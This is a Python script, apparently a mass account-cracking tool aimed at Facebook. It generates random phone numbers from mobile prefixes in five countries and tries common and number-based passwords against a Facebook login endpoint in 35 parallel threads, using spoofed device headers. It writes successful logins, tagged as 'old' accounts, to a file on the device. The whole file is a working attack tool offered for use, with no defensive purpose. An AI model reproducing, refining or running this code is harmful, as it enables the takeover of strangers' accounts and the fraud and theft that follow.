#--------------------------------------------------------------#
# OWNER: CHARSI / MYSTERY | VERSION: V4.0 GRAND-MASTER
# TARGET: OLD ACCOUNTS (2004-2011) | GLOBAL REGIONS
# UPDATE: HEAVY PASSWORDS + OLD ID FILTER + SIM HUB
#--------------------------------------------------------------#
import os, sys, time, json, re, random, uuid, requests
from concurrent.futures import ThreadPoolExecutor as tred

# Global Storage
loop, oks, cps = 0, [], []

def generate_ua(old=False):
    """ 2025 Hybrid UA Engine: Old Devices for Old IDs """
    if old: # Purani IDs ke liye purane phones ka UA
        and_v = random.choice(['5.1.1','6.0.1','7.1.2','8.1.0'])
        mod = random.choice(['SM-J700F', 'SM-G610F', 'GT-I9500', 'SM-N9005'])
    else: # New IDs ke liye modern UA
        and_v = random.choice(['12','13','14','15'])
        mod = random.choice(['SM-S928B', '23127PN0CG', 'V2303', 'Pixel 9'])
    
    chrome = f"{random.randint(100, 131)}.0.{random.randint(4000, 7000)}.{random.randint(10, 160)}"
    return f'Mozilla/5.0 (Linux; Android {and_v}; {mod}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{random.randint(300,500)}.0.0.0;]'

def logo():
    os.system('clear')
    print(f'''\033[1;32m
   ______   _______ .__   __. 
  /  ____| |   ____||  \ |  | 
 |  |  __  |  |__   |   \|  | 
 |  | |_ | |   __|  |  . `  | 
 |  |__| | |  |____ |  |\   | 
  \______| |_______||__| \__| \033[1;37m(GRAND-MASTER V4)
----------------------------------------------
 OWNER   :  CHARSI / MYSTERY
 FILTER  :  STRICT OLD ID (2004-2011) DETECTOR
 HUB     :  PK, IN, BD, NG, PH (ALL SIMS)
----------------------------------------------''')

def ___CHARSI_MASTER___(ids, passlist):
    global loop, oks, cps
    sys.stdout.write(f'\r\r \033[1;90m[\033[1;32mCHARSI-V4\033[1;90m] %s | OK:%s | CP:%s' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    try:
        for pas in passlist:
            ua = generate_ua(old=True)
            headers = {
                'Host': 'graph.facebook.com',
                'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'user-agent': ua,
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger'
            }
            data = {
                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()),
                'email': ids, 'password': pas, 'generate_session_cookies': '1', 'method': 'auth.login'
            }
            res = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers).json()
            
            if 'session_key' in res:
                uid = str(res['uid'])
                # Strict Old ID Filter Logic
                is_old = "NOT OLD"
                if len(uid) <= 9: is_old = "2004-2005 (RARE)"
                elif uid.startswith('100000'): is_old = "2009-2010 (OLD)"
                elif uid.startswith('10000'): is_old = "2011-2012 (OLD)"
                
                print(f'\r\r \033[1;32m[CHARSI-OK] {uid} | {pas} | {is_old}')
                oks.append(uid)
                open('/sdcard/CHARSI-V4-OK.txt', 'a').write(uid+'|'+pas+'|'+is_old+'\n')
                break
            elif 'checkpoint' in str(res):
                cps.append(ids); break
        loop += 1
    except: pass

def Charsi_Menu():
    logo()
    print(' [1] PAKISTAN (JAZZ, ZONG, TELENOR, UFONE)')
    print(' [2] INDIA (AIRTEL, JIO, VI, BSNL)')
    print(' [3] BANGLADESH (GP, ROBI, BL, AIRTEL)')
    print(' [4] NIGERIA (MTN, AIRTEL, GLO, 9MOBILE)')
    print(' [5] PHILIPPINES (GLOBE, SMART, TM)')
    print(' [0] EXIT')
    choice = input('\n [•] CHOICE: ')
    
    if choice == '1':
        codes = ['0300','0301','0345','0312','0333','0321']
        p_extra = ['pakistan', '786786', 'khan123', 'khan786', 'pubg123']
    elif choice == '2':
        codes = ['+91700','+91800','+91900','+91600','+91990']
        p_extra = ['india123', 'india786', '000000', '572730']
    elif choice == '3':
        codes = ['+88017','+88018','+88019','+88013','+88016']
        p_extra = ['bangla123', 'bangla786', 'jannat123', 'dhaka123']
    elif choice == '4':
        codes = ['+234803','+234806','+234703','+234810','+234903']
        p_extra = ['nigeria123', '1234567', 'god123', 'love123']
    elif choice == '5':
        codes = ['+63917','+63918','+63920','+63905','+63916']
        p_extra = ['pogi123', 'manila123', 'philippines123', 'love888']
    else: exit()

    limit = int(input(' [•] LIMIT PER SIM CODE: '))
    
    with tred(max_workers=35) as pool:
        logo()
        print(f' [•] CRACKING STARTED WITH {len(codes)} SIM CODES')
        print(f' [•] FILTERING OLD ACCOUNTS (2004-2011)')
        print('----------------------------------------------')
        for code in codes:
            for _ in range(limit):
                uid = code + str(random.randint(1111111, 9999999))
                # Heavy Professional Password Set
                passwords = [
                    uid, uid[:6], uid[:7], uid[3:], # Number based
                    '123456', '1234567', '12345678', '123456789', # Sequential
                    '000000', '786786', '112233', '445566' # Common
                ] + p_extra
                pool.submit(___CHARSI_MASTER___, uid, passwords)

    print(f'\n----------------------------------------------\n [•] DONE! TOTAL OK: {len(oks)}')

if __name__ == '__main__':
    Charsi_Menu()
